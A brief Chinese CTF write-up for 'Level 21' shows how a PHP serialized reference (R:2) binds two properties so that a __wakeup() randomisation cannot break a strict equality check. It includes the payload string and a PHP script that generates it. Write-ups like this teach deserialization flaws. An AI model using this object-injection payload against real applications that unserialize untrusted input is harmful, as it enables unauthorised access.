# WriteUP · Level 21 · 引用的利用

## 原理

`__wakeup()` 每次都会把 `$tj_token` 刷成随机值,你无法预测它。
序列化串中的 `R:n` 表示引用——两个属性指向同一份存储:

```
O:4:"FLAG":2:{s:8:"tj_token";i:1;s:14:"helloctf_token";R:2;}
```

`R:2` 让 `helloctf_token` 与 `tj_token` 是同一份值,`__wakeup` 修改前者时后者同步变化,
严格相等 `===` 永远成立。

## EXP

```php
class FLAG {
    public $tj_token;
    public $helloctf_token;
}
$o = new FLAG();
$o->tj_token = 1;
$o->helloctf_token = &$o->tj_token;   // 注意 & 引用赋值
echo urlencode(serialize($o));
```

